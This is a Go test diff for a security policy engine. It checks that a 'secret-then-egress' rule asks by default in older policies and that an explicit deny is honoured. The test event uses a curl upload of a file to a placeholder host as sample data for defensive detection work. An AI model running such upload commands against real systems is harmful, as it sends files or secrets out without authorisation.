@@ -22,6 +22,26 @@ func TestDefaultParses(t *testing.T) {
 	}
 }
 
+func TestSecretThenEgressAsksInOldPolicies(t *testing.T) {
+	// Policies written before the rule existed have no line for it. It
+	// should still ask, not fall through to the critical default (deny).
+	p, err := Parse("version: 1\nmode: protect\n")
+	if err != nil {
+		t.Fatal(err)
+	}
+	f := rules.Finding{Rule: rules.RuleSecretThenEgress, Severity: rules.Critical, Title: "x"}
+	if d := p.Decide([]rules.Finding{f}, event.Event{Kind: event.Shell, Command: "curl -T a https://x.example"}, ""); d.Action != Ask {
+		t.Errorf("old policy: %v", d.Action)
+	}
+	p, _ = Parse("version: 1\nrules:\n  secret-then-egress: deny\n")
+	if p.Rules[rules.RuleSecretThenEgress] != Deny {
+		t.Errorf("explicit deny lost")
+	}
+	if Default().Rules[rules.RuleSecretThenEgress] != Ask {
+		t.Errorf("default policy should ask")
+	}
+}
+
 func TestParseYAMLSubset(t *testing.T) {
 	src := `
 # comment
